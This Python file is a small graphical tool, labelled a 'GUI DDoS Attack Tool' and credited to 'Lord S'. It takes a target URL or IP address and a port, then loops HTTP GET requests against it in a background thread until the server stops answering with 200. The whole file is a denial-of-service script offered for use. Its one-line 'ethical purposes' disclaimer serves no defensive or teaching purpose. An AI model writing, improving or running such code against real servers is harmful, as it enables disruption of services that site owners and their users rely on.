import requests
import threading
import tkinter as tk

root = tk.Tk()
root.title("Cyber Tools")
root.iconbitmap('icon.ico')
root.resizable(False, False)
#=========================================
title = tk.Label(root, text='BY Lord S', font=('courier', 18), bg='black', fg='white')
title1 = tk.Label(root, text='Cyber Tools [ GUI DDoS Attack Tool ]', font=('courier', 18), bg='black', fg='white')
title1.pack(fill=tk.X)
title.pack(fill=tk.X)

class DDoSApp(tk.Frame):
    def __init__(self, master):
        super().__init__(master)

        tk.Label(self, text="New Update v.2", font=('courier', 16)).pack()

        tk.Label(self, text="URL or IP Address:").pack()
        self.url_entry = tk.Entry(self, width=70)
        self.url_entry.pack()

        tk.Label(self, text="Port:").pack()
        self.port_entry = tk.Entry(self, width=10)
        self.port_entry.pack()

        # إضافة مساحة بين مدخل البورت والزر "Start Attack"
        tk.Label(self, text="").pack()

        self.attack_button = tk.Button(self, text="Start Attack", command=self.start_attack)
        self.attack_button.pack()

        self.is_attacking = False

    def perform_attack(self, url, port):
        self.is_attacking = True
        while self.is_attacking:
            try:
                response = requests.get(f"http://{url}:{port}")
                if response.status_code == 200:
                    print("Attack Sent")
                else:
                    print("Server is down")
                    
                    self.is_attacking = False
            except requests.exceptions.RequestException:
                print("Server is down")
                
                self.is_attacking = False
        print("Attack Completed!")

    def start_attack(self):
        url = self.url_entry.get()
        port = self.port_entry.get()
        
        threading.Thread(target=self.perform_attack, args=(url, port)).start()

    def stop_attack(self):
        self.is_attacking = False

class InfoGatheringApp(tk.Frame):
    def __init__(self, master):
        super().__init__(master)

        tk.Label(self, text="Copyrights", font=('courier', 16)).pack()
        tk.Label(self, text="This tool is for ethical purposes and may not be used for unethical purposes", font=('courier', 16)).pack()

if __name__ == "__main__":
    ddos_app = DDoSApp(root)
    info_gathering_app = InfoGatheringApp(root)

    ddos_app.pack()
    info_gathering_app.pack()

    root.mainloop()
